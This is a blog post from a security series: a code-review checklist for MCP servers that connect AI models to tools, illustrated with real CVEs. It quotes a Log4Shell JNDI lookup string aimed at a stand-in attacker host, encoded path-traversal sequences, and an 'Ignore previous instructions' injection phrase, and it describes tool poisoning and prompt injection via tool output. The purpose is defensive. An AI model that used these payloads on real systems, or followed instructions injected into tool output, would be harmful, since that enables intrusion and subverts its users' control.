# Post 21: Code Review Checklist for MCP Security — What to Look For

**Reading time:** 10 minutes | **Difficulty:** Intermediate  
**Published:** 2026-06-20

---

## The Checklist Problem

Posts 15-20 built a security foundation — authentication, authorization, audit logging, configuration, input validation, and tool execution. Each post described a defense layer. But adding security code isn't enough. **Security code that gets bypassed is worse than no security code: it creates false confidence.**

Heartbleed (CVE-2014-0160) passed code review. Four committers saw the vulnerable code before it shipped. The `memcpy` call that read 64KB of server memory from a 0-byte heartbeat packet looked like ordinary C. **Code review only catches what reviewers know to look for.**

This post gives you an explicit checklist: six categories, specific anti-patterns, and the CVE that proves each one matters.

---

## Why Code Review Misses Security Bugs

Most developers review code for correctness — does this do what it should? Security review is different: can this be abused?

Security failures are different from correctness bugs:

1. **The logic is correct but the context is wrong** — `validate_arguments()` is called correctly, but only on some code paths
2. **The call is present but misconfigured** — `PathValidator` is used but `allow_absolute_paths = true`
3. **The check is bypassed** — auth check present in one handler, missing in a newly added one
4. **Output is trusted** — tool result returned directly to LLM without sanitization
5. **Configuration is hard-coded** — secrets in source, not loaded from vault

Security code review requires checking what's *absent*, not just what's present.

---

## What CVEs Tell Us About Missed Checks

### CVE-2022-1388: F5 BIG-IP Authentication Bypass

**CVSS:** 9.8 | **Impact:** Unauthenticated remote code execution

The iControl REST API bypassed authentication for requests with a specific connection header. Authentication existed — it was just not called for that code path.

**The pattern:** Authentication is checked in most places. The bug is one handler that doesn't call `validate_request()`.

**What to review:** Every MCP handler must call `validate_request()` before dispatching. Grep for `call_tool` implementations without a preceding auth check.

---

### CVE-2023-22515: Atlassian Confluence Privilege Escalation

**CVSS:** 10.0 | **Impact:** Unauthenticated users create admin accounts

Confluence exposed a setup endpoint without authorization checks. Users were authenticated — but any authenticated user could create admin accounts because authorization was missing.

**The pattern:** Authorization (`can_access_resource()`) is not the same as authentication (`validate_request()`). Both must be checked independently.

**What to review:** Every protected operation must call `can_access_resource()` with the appropriate role. Audit that `Role::USER` actions cannot reach `Role::ADMIN` operations.

---

### CVE-2021-41773: Apache httpd Path Traversal

**CVSS:** 7.5 (9.8 with mod_cgi) | **Impact:** Read files outside document root; RCE with mod_cgi enabled

Apache 2.4.49 failed to reject `%2e%2e/` (URL-encoded `../`) in paths. A path traversal check existed — it didn't cover encoded variants.

**The pattern:** Path validation must handle all encoding forms. `../`, `%2e%2e/`, and `%252e%252e/` (double-encoded) all traverse. A check that handles only one form is incomplete.

**What to review:** Every path argument must pass through `PathValidator::is_safe_path()`. That validator covers raw sequences, URL-encoded sequences, and null bytes. Any direct `stat()` or `open()` call without `PathValidator` is a red flag.

---

### CVE-2021-44228: Log4Shell

**CVSS:** 10.0 | **Impact:** Remote code execution via logged user-supplied data

Log4j processed JNDI lookup strings (`${jndi:ldap://attacker.com/x}`) found in logged user input. Data that should be inert was executed as a lookup directive.

**The MCP parallel:** A tool that reads external data — files, APIs, databases — and returns it to the LLM without sanitization can carry prompt injection. The LLM executes "instructions" found in tool output the same way Log4j executed "instructions" found in log strings.

**What to review:** Every `ToolResult` must pass through `ResponseSanitizer::sanitize()`. Check that `contains_injection_patterns()` is invoked for external data before it reaches the LLM.

---

### CVE-2023-46604: Apache ActiveMQ Remote Code Execution

**CVSS:** 10.0 | **Impact:** Unauthenticated RCE via ClassInfo deserialization

ActiveMQ deserialized `ClassInfo` objects from the network without validating the class name. Any class registered in the JVM could be instantiated and invoked.

**The MCP parallel:** An MCP server that dispatches tool calls without validating the tool name and arguments can be directed to call unexpected handlers or pass malformed parameters to registered tools.

**What to review:** `InputValidationHandler::validate_arguments()` must have registered rules for every tool. Verify `strict_mode = true` (reject unknown arguments) and that every tool in `list_tools()` has a corresponding `ToolValidationRules` registration.

---

## The Six-Category Checklist

### Category 1: Authentication

```
□ Every handler calls validate_request() before any tool dispatch
□ Auth failures return generic errors — no difference between "expired" and "invalid"
□ configure_auth() sets min_token_length >= 16
□ configure_auth() sets max_failed_attempts (lockout after N failures)
□ No hard-coded tokens in source code or committed config files
```

**mcptoolkit reference:** `AuthenticationHandler::validate_request()` — `include/authentication_handler.h`

---

### Category 2: Authorization

```
□ Every tool call checks can_access_resource() before operating on resources
□ Role hierarchy enforced: GUEST < USER < ADMIN — USER cannot reach ADMIN operations
□ Resource ownership checked (USER can read own resources, not others')
□ Authorization checked AFTER authentication, not instead of it
□ New tools added to permission policy before they're reachable
```

**mcptoolkit reference:** `RoleBasedAccessControl::can_access_resource()` — `include/rbac.h`

---

### Category 3: Input Validation

```
□ All tools have registered ToolValidationRules with strict_mode = true
□ Path arguments pass through PathValidator::is_safe_path() — not raw string checks
□ No string concatenation into shell commands (use parameterized APIs)
□ URL-encoded metacharacters detected (contains_encoded_metacharacters())
□ Argument regex patterns are whitelists, not blacklists
```

**mcptoolkit reference:** `InputValidationHandler::validate_arguments()` — `include/input_validation.h`

---

### Category 4: Output Sanitization

```
□ All ToolResult text passes through ResponseSanitizer::sanitize()
□ contains_injection_patterns() checked for external data returned to LLM
□ Error messages redact file paths (redact_paths())
□ Control characters escaped in responses (escape_control_characters())
□ Response size bounded (max_response_size, default 1 MB)
```

**mcptoolkit reference:** `ResponseSanitizer::sanitize()` — `include/response_sanitizer.h`

---

### Category 5: Tool Execution Safety

```
□ Every tool execution wrapped in ToolExecutionGuard
□ Timeout configured (default 30s) — long operations have explicit, justified limits
□ Output size bounded by max_output_size in ExecutionConfig
□ No malloc() without a size limit check before allocation
□ TOCTOU avoided: use fstat(fd) after atomic open(), not stat() then open()
```

**mcptoolkit reference:** `ToolExecutionGuard` — `include/tool_execution_guard.h`

---

### Category 6: Secrets and Configuration

```
□ No secrets, API keys, or passwords in source code (grep for "password =", "api_key =")
□ set_token_secret() called with runtime-loaded secret, not a hard-coded string
□ AuthConfig loaded from environment or vault, not committed config
□ Token TTL configured (token_ttl != 0 — tokens expire)
□ .gitignore excludes .env, *.key, config/production.*
```

**mcptoolkit reference:** `AuthConfig` — `include/authentication_handler.h`

---

## Using the Checklist

Each item is a yes/no question, not a judgment call. If any box is unchecked, the PR doesn't merge.

The checklist scales: a simple read-only tool needs Categories 1, 2, and 3. A tool that calls external services or returns external data needs all six.

Add it to your PR template. The first time you run through it on an existing codebase, you'll find at least one gap. That gap is the next breach if you don't address it.

---

## What Checklists Don't Catch

Manual code review — even with a checklist — misses patterns that span multiple files, configuration values passed at runtime, and memory errors that only surface under specific conditions. Human review catches intent bugs; automated tools catch mechanical bugs. You need both.

---

## 2026 Addendum: What the Real Attack Data Says

Writing Posts 1–20, I focused on parser memory safety as the primary risk surface. The 2026 CVE data tells a different story.

In the first half of 2026, the practical MCP attack surface broke down into four categories — and all four map directly to items on this checklist:

**Tool poisoning** — Malicious tool definitions smuggle instructions into the LLM via description fields. The vector is a missing check in `validate_tool_definition()` on the description length and content. Category 4 (output sanitization) is the defense: treat tool descriptions as untrusted data.

**Path traversal in file-operation tools** — The most common RCE vector in deployed MCP servers. Every real-world case involved a file-read or file-write tool that skipped `PathValidator`. Category 3, one checkbox.

**Missing authentication on tool endpoints** — Servers expose tools without calling `validate_request()` because "this is only used internally." Then someone routes external traffic to the internal port. Category 1, one checkbox.

**Prompt injection via tool output** — A tool fetches a webpage, reads a file, or queries a database. The response contains `Ignore previous instructions and...`. The LLM follows it. Category 4, `contains_injection_patterns()`.

The checklist in this post covers all four. The sophistication isn't in the attacks — it's in consistently applying basic checks to every tool, every time. That's what the checklist is for.


---

## What's Next

Twenty-one posts of theory is enough. In the next post, we put this checklist — and everything behind it — to work on a real server we build from scratch: a C++ MCP adaptor, connected to Claude, ChatGPT, Gemini, and Grok, tested end to end, and then attacked with the very techniques this series has cataloged. The checklist stops being a document and becomes a gate on a living codebase.
